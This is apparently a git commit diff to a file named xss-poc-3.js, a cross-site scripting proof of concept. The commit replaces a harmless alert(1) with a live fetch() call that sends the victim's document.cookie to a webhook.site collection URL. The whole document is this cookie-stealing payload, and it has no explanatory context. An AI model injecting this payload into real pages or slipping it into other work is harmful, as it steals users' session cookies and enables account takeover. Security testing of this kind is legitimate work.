5f69aca9efe2f9e23da6d330de60af8a1de1586c
0xdiego <93290842+diegojoel301@users.noreply.github.com>
2024-06-25 17:22:01 +0200

    Update xss-poc-3.js

--- xss-poc-3.js
+++ xss-poc-3.js
@@ -1,3 +1,3 @@
-//fetch("https://webhook.site/18c8bcc4-bed9-473d-9f49-f22ec3133adb/" + document.cookie);
-alert(1);
+fetch("https://webhook.site/67da8974-bf85-4fcf-b226-3c5f674d0c0b" + document.cookie);
+//alert(1);
 
